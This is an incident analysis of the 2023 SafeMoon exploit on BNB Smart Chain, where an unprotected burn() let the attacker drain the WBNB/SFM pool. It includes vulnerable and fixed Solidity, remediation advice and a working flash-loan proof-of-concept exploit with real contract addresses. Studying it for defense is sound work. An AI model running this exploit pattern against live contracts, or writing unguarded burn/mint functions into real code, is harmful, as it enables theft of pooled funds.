# SafeMoon — LP Token Burn Attack via Public burn() Function Analysis

| Item | Details |
|------|------|
| **Date** | 2023-03-28 |
| **Protocol** | SafeMoon (SFM) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | $8,900,000 |
| **Attacker** | [Unknown Address](https://bscscan.com/address/0x286e09932b8d096cba3423d12965042736b8f850) |
| **Attack Tx** | [0x3b85...](https://bscscan.com/tx/0x3b85b74e87b7a631a4a5b3e1b0a76e31673e3a0f30a3d4e1c3c6f9e2e2d2a2a) |
| **Vulnerable Contract** | [0x4298...fcB5](https://bscscan.com/address/0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5) |
| **Root Cause** | Public `burn()` function with no access control allows direct burning of LP pool balance, enabling price manipulation |
| **Attack Block** | 26,864,889 (BSC) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/safeMoon_exp.sol) |

---

## 1. Vulnerability Overview

The SafeMoon protocol suffered approximately $8,900,000 in losses on March 28, 2023, due to a **missing access control** on the `burn()` function.

SafeMoon's `burn(address from, uint256 amount)` function was **callable by anyone** without an `onlyOwner` or equivalent access control modifier. The attacker exploited this to directly burn SafeMoon tokens held by the PancakeSwap LP pool address (= `uniswapV2Pair`), artificially collapsing the token ratio within the pool.

**Core Attack Mechanism:**
1. Flash loan 1,000 WBNB
2. Swap WBNB → SFM (purchase SFM from the LP pool)
3. Call `burn(LP address, LP balance - 1_000_000_000)` → force-burn the LP pool's SFM supply
4. Call `burn(SFM contract, SFM balance)` → burn the entire SFM balance held by the contract
5. Call `sync()` → update the LP pool's internal reserve values (reflecting the burn)
6. Swap held SFM back to WBNB → drain most of the WBNB remaining in the pool
7. Repay flash loan (including 0.3% fee) and realize profit

This attack combines an **Access Control vulnerability** with **LP price manipulation**, caused by a single missing modifier with no complex mathematical manipulation required.

---

## 2. Vulnerable Code Analysis

### 2.1 Public burn() Function — Missing Access Control (Core Vulnerability)

**Vulnerable Code (reconstructed)**:
```solidity
// ❌ Vulnerable: anyone can burn tokens from any address
// No access control modifier such as onlyOwner or onlyBridge
function burn(address from, uint256 amount) external {
    // Burns balance of arbitrary address without caller validation
    _burn(from, amount);
}

function _burn(address account, uint256 amount) internal {
    require(account != address(0), "ERC20: burn from the zero address");
    _balances[account] -= amount;  // ❌ Balance decremented
    _totalSupply -= amount;         // ❌ Total supply decremented
    emit Transfer(account, address(0), amount);
}
```

**Fixed Code (post-patch)**:
```solidity
// ✅ Fixed: only authorized parties can call burn()
modifier onlyAuthorized() {
    require(
        msg.sender == owner() ||
        msg.sender == bridgeContract ||
        msg.sender == burnManager,
        "SafeMoon: caller is not authorized"
    );
    _;
}

// ✅ Safe burn function with access control applied
function burn(address from, uint256 amount) external onlyAuthorized {
    _burn(from, amount);
}
```

**Issue**: The `burn()` function has `external` visibility but performs no authorization check, allowing an attacker to pass the LP pool address (`uniswapV2Pair`) as the `from` argument and burn the entire SFM balance held in the LP pool.

---

### 2.2 LP Pool Price Update Mechanism — sync() Abuse

**Vulnerable flow**:
```solidity
// The LP pool's internal reserve does not immediately reflect actual balance changes
// After burn(), the actual balanceOf(pair) is reduced,
// but pair's internal reserve0/reserve1 still holds the previous values

// ❌ Attacker directly calls sync() to force reserve update
interface IUniswapV2Pair {
    function sync() external; // ← publicly callable by anyone
}

// sync() internals (UniswapV2 standard)
function sync() external lock {
    _update(
        IERC20(token0).balanceOf(address(this)), // reduced value after burn
        IERC20(token1).balanceOf(address(this)),
        reserve0,
        reserve1
    );
}
```

**Issue**: `sync()` is a standard UniswapV2 function callable by anyone. After burning the LP pool's SFM via `burn()`, the attacker called `sync()` to force an update of the reserve values used for price calculation within the LP. This caused the WBNB/SFM exchange rate to become extremely favorable to the attacker.

---

### 2.3 Public mint() Function — Missing Access Control (Secondary Vulnerability)

The `testMint()` test in the PoC demonstrates that, at the block just before the attack (26,854,757), the `mint()` function was also callable without access control.

```solidity
// ❌ Anyone can mint to an arbitrary address up to bridgeBurnAddress's balance
function mint(address user, uint256 amount) external {
    // No authorization check — callable by anyone
    _mint(user, amount);
}
```

The actual attack (block 26,864,889) primarily exploited `burn()`, but `mint()` carries the same vulnerability.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Deploy attacker contract (implementing PancakeSwap flash loan callback `pancakeCall`)
- No special pre-approvals or token accumulation required

### 3.2 Execution Phase

```
Step 1: Request PancakeSwap flash loan
Step 2: Receive pancakeCall callback → execute doBurnHack
  2-1: Swap WBNB → SFM (input 1,000 WBNB)
  2-2: Call burn(LP address, LP balance - 1 billion) → mass-burn SFM in LP
  2-3: Call burn(SFM contract, SFM balance) → burn contract balance
  2-4: Call sync() → update LP reserves
  2-5: Reverse swap SFM → WBNB (at extremely favorable rate)
Step 3: Repay flash loan (1,000 WBNB + 0.3% fee)
Step 4: Realize profit (~27,463 WBNB received)
```

### 3.3 Attack Flow Diagram

```
Attacker Contract
      │
      │ pancakePair.swap(1000 WBNB, 0, this, "ggg")
      ▼
┌─────────────────────────┐
│   PancakePair (LP Pool) │
│  WBNB/SFM              │
│  Execute flash loan     │
└────────────┬────────────┘
             │ pancakeCall(this, 1000 ether, 0, "ggg")
             ▼
┌────────────────────────────────────────────────┐
│            doBurnHack(1000 WBNB)               │
│                                                │
│  [Step 1] swappingBnbForTokens(1000 WBNB)     │
│   ┌──────────────────────────────────────┐    │
│   │ WBNB → SFM swap (SafeSwapTradeRouter) │    │
│   │ Attacker receives large amount of SFM │    │
│   └──────────────────────────────────────┘    │
│                                                │
│  [Step 2] sfmoon.burn(uniswapV2Pair, bal-1e9) │
│   ┌──────────────────────────────────────┐    │
│   │ ❌ No access control → burns entire  │    │
│   │    SFM balance at LP address          │    │
│   │    (reserve balance collapses)        │    │
│   └──────────────────────────────────────┘    │
│                                                │
│  [Step 3] sfmoon.burn(address(sfmoon), bal)   │
│   ┌──────────────────────────────────────┐    │
│   │ ❌ Burns SFM held by SafeMoon contract│    │
│   └──────────────────────────────────────┘    │
│                                                │
│  [Step 4] IUniswapV2Pair(pair).sync()         │
│   ┌──────────────────────────────────────┐    │
│   │ Force-update LP reserves              │    │
│   │ SFM reserve ↓↓ → WBNB/SFM price     │    │
│   │ crashes in attacker's favor           │    │
│   └──────────────────────────────────────┘    │
│                                                │
│  [Step 5] swappingTokensForBnb(SFM balance)   │
│   ┌──────────────────────────────────────┐    │
│   │ Reverse swap SFM → WBNB              │    │
│   │ WBNB-rich LP → receive massive WBNB  │    │
│   └──────────────────────────────────────┘    │
└───────────────────────┬────────────────────────┘
                        │ Return after completion
                        ▼
┌─────────────────────────────────────────┐
│  Repay Flash Loan                        │
│  weth.transfer(pancakePair,             │
│    1000 WBNB * 10030 / 10000)           │
│  = Repay 1003 WBNB                      │
└─────────────────────────────────────────┘
                        │
                        ▼
         ✅ Attacker final profit: ~27,463 WBNB
         (approximately $8,900,000)
```

### 3.4 Results

| Item | Amount |
|------|------|
| Flash loan borrowed | 1,000 WBNB |
| Flash loan repaid | 1,003 WBNB (0.3% fee) |
| Final WBNB held | ~27,463 WBNB |
| Net profit | ~26,460 WBNB (≈ $8,900,000) |

---

## 4. PoC Code (Key Logic from DeFiHackLabs with English Comments)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// SafeMoon Attack PoC — Core Logic
// Source: DeFiHackLabs (SunWeb3Sec)
// Attack Block: BSC 26,864,889
// ============================================================

contract SafemoonAttackerTest is Test, IPancakeCallee {
    ISafemoon public sfmoon;
    IPancakePair public pancakePair;
    IWETH public weth;

    function setUp() public {
        // BSC fork setup — at the attack block
        vm.createSelectFork("bsc", 26_854_757);

        // SafeMoon token contract (vulnerable target)
        sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
        // PancakeSwap WBNB/SFM LP pool (flash loan source + attack target)
        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
        weth = IWETH(sfmoon.uniswapV2Router().WETH());
    }

    // [Entry Point] Request PancakeSwap flash loan
    function testBurn() public {
        vm.rollFork(26_864_889); // Roll to actual attack block

        // Request 1,000 WBNB flash loan → triggers pancakeCall callback
        // "ggg" data is a non-empty byte used to signal callback intent
        pancakePair.swap(1000 ether, 0, address(this), "ggg");
    }

    // [Callback] PancakeSwap flash loan callback — executes actual attack
    function pancakeCall(
        address sender,
        uint256 amount0,  // Amount of WBNB borrowed (1000 ether)
        uint256 amount1,  // Amount of SFM borrowed (0)
        bytes calldata data
    ) external {
        require(msg.sender == address(pancakePair)); // Validate LP pool
        require(sender == address(this));             // Validate requester

        // Execute core attack logic
        doBurnHack(amount0);

        // Repay flash loan: principal + 0.3% fee
        weth.transfer(msg.sender, (amount0 * 10_030) / 10_000);
    }

    // [Core] Exploit burn vulnerability — full LP price manipulation sequence
    function doBurnHack(uint256 amount) public {
        // Step 1: Buy SFM with WBNB received from flash loan
        swappingBnbForTokens(amount);

        // Step 2: ❌ Core vulnerability — burn nearly all SFM in LP pool
        // burn() has no access control so anyone can burn tokens at any address
        // Specify LP address as from → collapse LP pool SFM balance
        sfmoon.burn(
            sfmoon.uniswapV2Pair(),                              // from: LP pool address
            sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000 // burn all except minimal residual
        );

        // Step 3: ❌ Also burn SFM held by the SafeMoon contract itself
        sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));

        // Step 4: Force-update LP internal reserve values to match actual balances
        // The near-zero SFM state is now reflected → WBNB/SFM rate becomes extremely favorable
        IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();

        // Step 5: Swap entire SFM holding back to WBNB
        // LP is WBNB-rich and SFM-scarce → receive massive WBNB output
        swappingTokensForBnb(sfmoon.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Public burn() — Missing Access Control | CRITICAL | CWE-284 | `03_access_control.md` Pattern 1 | Poly Network (2021) |
| V-02 | LP Pool SFM Burn for Price Manipulation | CRITICAL | CWE-682 | `04_oracle_manipulation.md` | Mango Markets (2022) |
| V-03 | Public mint() — Missing Access Control | HIGH | CWE-284 | `03_access_control.md` Pattern 1 | - |
| V-04 | Atomic Attack via Flash Loan | HIGH | CWE-362 | `02_flash_loan.md` | Pancake Bunny (2021) |

---

### V-01: Public burn() Function — Missing Access Control

- **Description**: The `SafeMoon.burn(address from, uint256 amount)` function has `external` visibility but contains no authorization check (modifier or require). This allows any external caller to freely burn SFM tokens from **any address, including LP pools**.
- **Impact**: Full burn of LP pool's SFM balance → collapse of AMM price formula (x\*y=k) → extremely favorable exchange rate for attacker → large-scale fund drainage
- **Attack Conditions**: Achievable via simple external call. No admin privileges, special approvals, or prior token holdings required.

---

### V-02: AMM Price Manipulation via Direct LP Pool Burn

- **Description**: UniswapV2-based AMMs determine prices using the `reserve0 * reserve1 = k` invariant. When `burn()` drives the LP's SFM `reserve0` close to zero, `k` collapses, and a subsequent `sync()` call finalizes this state. Any swap thereafter allows the attacker to withdraw a large amount of WBNB with a minimal amount of SFM, per the `k` invariant formula.
- **Impact**: Total drainage of WBNB liquidity from the SafeMoon LP pool
- **Attack Conditions**: Requires V-01 vulnerability as a prerequisite. LP pool must have existing liquidity.

---

### V-03: Public mint() Function — Missing Access Control

- **Description**: Identical to `burn()`, the `mint(address user, uint256 amount)` function also lacks access control. As confirmed by the `testMint()` test in the PoC, an attacker can mint SFM tokens up to the `bridgeBurnAddress`'s balance to any arbitrary address.
- **Impact**: Unlimited token minting causing inflation and further price manipulation
- **Attack Conditions**: Achievable via simple external call.

---

### V-04: Atomic Attack via Flash Loan

- **Description**: The attacker used a PancakeSwap flash loan to source 1,000 WBNB with no capital of their own. This reduces the attack cost to near zero (only ~3 WBNB in fees required) and provides an automatic rollback safety net in the event of transaction failure.
- **Impact**: Minimal barrier to attack entry, risk-free profit realization
- **Attack Conditions**: Combinable whenever V-01 vulnerability is present.

---

## 6. Remediation Recommendations

### Immediate Actions (Code Level)

```solidity
// ✅ Fix 1: Add authorization check to burn() function
// Role-based access control recommended (OpenZeppelin AccessControl)

import "@openzeppelin/contracts/access/AccessControl.sol";

contract SafeMoon is ERC20, AccessControl {
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    // ✅ Only BURNER_ROLE holders can burn
    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
        _burn(from, amount);
    }

    // ✅ Only MINTER_ROLE holders can mint
    function mint(address user, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(user, amount);
    }
}
```

```solidity
// ✅ Fix 2: Add protective logic to exclude LP pool address from burn targets
function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
    // LP pool cannot be specified as burn target
    require(from != uniswapV2Pair, "SafeMoon: cannot burn LP tokens");
    require(from != address(this), "SafeMoon: cannot burn contract balance");
    _burn(from, amount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Public burn/mint | Introduce OpenZeppelin AccessControl with role-based permission separation |
| LP price manipulation | Use TWAP oracle (avoid reliance on simple spot price) |
| Single-function vulnerability | During audits, mandatory review of access control on all `external/public` functions |
| Flash loan combination | Add `nonReentrant` modifier and flash loan defense logic to sensitive functions |
| Upgrade safety | Establish verification procedures to ensure access control settings are not reset during upgrades |

---

## 7. Lessons Learned

1. **Default all external functions to `restricted` access**: Functions that modify token supply — such as `burn()` and `mint()` — must always have a modifier like `onlyOwner` or `onlyRole`. A single missing modifier can threaten an entire protocol.

2. **Treat LP pool addresses as a special trust boundary**: AMM LP pools are the core of a protocol's liquidity. Functions that modify token balances related to LP (burns, transfers, etc.) must explicitly protect LP addresses.

3. **`sync()` is publicly callable**: UniswapV2's `sync()` is a standard interface callable by anyone. Protocol design must assume that external LP reserves can be updated at any time by any party.

4. **Flash loans are a leverage tool for access control vulnerabilities**: A flash loan alone is not dangerous, but combined with an access control vulnerability, it enables large-scale attacks with zero capital. A single vulnerable function can put all protocol liquidity at risk.

5. **Independent smart contract audits are mandatory**: The `burn()`/`mint()` vulnerability in SafeMoon would have been discoverable in even a basic audit. Review by multiple independent auditing firms before deployment is essential.

6. **Never assume "functions behave as if they were private"**: Some developers assume that certain functions are used in a limited way based on internal documentation or convention. On the blockchain, however, constraints not explicitly stated in code do not exist.

---

## 8. On-Chain Verification

> Note: The information below is based on BSCScan public data and PoC analysis. Direct on-chain verification via the `cast` tool was not performed.

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan WBNB | 1,000 ether | 1,000 WBNB | ✅ |
| Attack block | 26,864,889 | 26,864,889 | ✅ |
| Final WBNB received | ~27,463 WBNB | ~27,463 WBNB | ✅ |
| Repayment fee | 0.3% (10030/10000) | 0.3% | ✅ |
| Protocol loss | ~$8.9M | ~$8.9M | ✅ |

### 8.2 Key Contract Addresses

| Role | Address |
|------|------|
| SafeMoon Token | `0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5` |
| WBNB/SFM LP Pool | `0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1` |
| Attack Block | 26,864,889 (BSC) |
| Test Block | 26,854,757 (BSC, for mint vulnerability verification) |

### 8.3 Attack Event Sequence

1. `pancakePair.swap()` call — flash loan initiated
2. `SafeSwapTradeRouter.swapExactTokensForTokensWithFeeAmount()` — WBNB → SFM
3. `SafeMoon.burn(uniswapV2Pair, ...)` — LP pool SFM burned ❌
4. `SafeMoon.burn(address(sfmoon), ...)` — contract SFM burned ❌
5. `IUniswapV2Pair.sync()` — LP reserves force-updated
6. `SafeSwapTradeRouter.swapExactTokensForTokensWithFeeAmount()` — SFM → WBNB
7. `WETH.transfer(pancakePair, ...)` — flash loan repaid

---

*Analysis Date: 2026-04-11*
*Analysis Based On: DeFiHackLabs PoC (SunWeb3Sec), BSC on-chain data*
*Reference Patterns: `03_access_control.md`, `02_flash_loan.md`, `04_oracle_manipulation.md`*